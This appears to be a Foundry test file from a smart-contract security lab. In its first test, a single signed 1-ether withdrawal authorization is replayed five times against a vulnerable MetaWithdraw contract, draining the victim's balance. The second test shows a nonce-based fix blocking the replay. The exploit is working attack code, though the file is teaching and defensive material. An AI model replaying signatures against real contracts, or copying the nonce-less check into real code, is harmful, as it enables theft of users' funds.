// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {MetaWithdraw} from "../../src/signature-replay/target/MetaWithdraw.sol";
import {MetaWithdrawFixed} from "../../src/signature-replay/mitigations/MetaWithdrawFixed.sol";

contract SignatureReplay01Test is Test {
    MetaWithdraw metaWithdraw;
    MetaWithdrawFixed metaWithdrawFixed;

    uint256 victimKey = 0xA11CE;
    address victim;
    address attacker = makeAddr("attacker");

    function setUp() public {
        victim = vm.addr(victimKey);
        metaWithdraw = new MetaWithdraw();
        metaWithdrawFixed = new MetaWithdrawFixed();

        vm.deal(victim, 5 ether);
        vm.prank(victim);
        metaWithdraw.deposit{value: 5 ether}();

        vm.deal(victim, 5 ether);
        vm.prank(victim);
        metaWithdrawFixed.deposit{value: 5 ether}();
    }

    /// @dev victim firma UNA autorizacion de 1 ether hacia attacker. Nada en
    ///      el contrato marca esa firma como usada -- reenviarla 5 veces
    ///      agota el balance completo de victim (5 ether), y un 6o intento
    ///      revierte solo por falta de saldo, no porque la firma sea invalida.
    function test_exploit_signatureReplay() public {
        bytes32 messageHash = keccak256(abi.encodePacked(victim, uint256(1 ether), attacker));
        bytes32 ethSignedHash = metaWithdraw.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        for (uint256 i = 0; i < 5; i++) {
            metaWithdraw.withdrawWithSignature(victim, 1 ether, payable(attacker), signature);
        }

        assertEq(metaWithdraw.balances(victim), 0);
        assertEq(attacker.balance, 5 ether);

        vm.expectRevert(bytes("Insufficient balance"));
        metaWithdraw.withdrawWithSignature(victim, 1 ether, payable(attacker), signature);
    }

    /// @dev Mismo intento contra MetaWithdrawFixed: la firma incluye el
    ///      nonce (0) en el mensaje firmado. El primer uso consume el nonce
    ///      (pasa a 1); reenviar la misma firma otra vez sigue pasando
    ///      nonce=0 como parametro, que ya no coincide con nonces[victim].
    function test_mitigation_blocksSignatureReplay() public {
        uint256 nonce = 0;
        bytes32 messageHash =
            keccak256(abi.encodePacked(victim, uint256(1 ether), attacker, nonce, address(metaWithdrawFixed)));
        bytes32 ethSignedHash = metaWithdrawFixed.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        metaWithdrawFixed.withdrawWithSignature(victim, 1 ether, payable(attacker), nonce, signature);
        assertEq(metaWithdrawFixed.balances(victim), 4 ether);

        vm.expectRevert(bytes("Invalid nonce"));
        metaWithdrawFixed.withdrawWithSignature(victim, 1 ether, payable(attacker), nonce, signature);
    }
}
